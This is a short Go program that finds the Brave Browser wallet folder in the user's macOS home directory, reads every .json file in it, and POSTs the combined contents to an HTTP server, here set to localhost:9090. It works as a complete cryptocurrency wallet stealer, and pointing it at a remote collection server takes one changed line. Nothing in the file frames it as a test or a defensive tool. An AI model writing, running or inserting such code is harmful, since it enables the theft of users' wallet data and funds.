package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
)

func main() {
	// Get the current user's home directory
	usr, err := os.UserHomeDir()
	if err != nil {
		fmt.Println("Error:", err)
		return
	}

	// Define the directory to check within the user's home directory
	desiredDir := filepath.Join(usr, "Library", "Application Support", "BraveSoftware", "Brave-Browser", "BraveWallet", "1.0.86")

	// Check if the directory exists
	if _, err := os.Stat(desiredDir); err == nil {
		// Read all .json files in the directory
		jsonFiles, err := filepath.Glob(filepath.Join(desiredDir, "*.json"))
		if err != nil {
			fmt.Println("Error:", err)
			return
		}

		// Map to hold JSON file content
		jsonData := make(map[string]interface{})

		// Read content of each .json file
		for _, file := range jsonFiles {
			fileData, err := ioutil.ReadFile(file)
			if err != nil {
				fmt.Println("Error reading file:", err)
				return
			}

			// Store file content in the map using the file name as key
			jsonData[filepath.Base(file)] = string(fileData)
		}

		// Convert map to JSON
		payload, err := json.Marshal(jsonData)
		if err != nil {
			fmt.Println("Error marshalling JSON data:", err)
			return
		}

		// Send the JSON data in a POST request to a web server
		serverURL := "http://localhost:9090"
		err = uploadJSON(serverURL, payload)
		if err != nil {
			fmt.Println("Error uploading JSON data:", err)
			return
		}

		fmt.Println("JSON data uploaded successfully.")
	} else if os.IsNotExist(err) {
		fmt.Printf("Directory %s does not exist in %s\n", desiredDir, usr)
	} else {
		fmt.Println("Error:", err)
	}
}

// Function to upload JSON data via HTTP POST request
func uploadJSON(url string, payload []byte) error {
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(payload))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	return nil
}
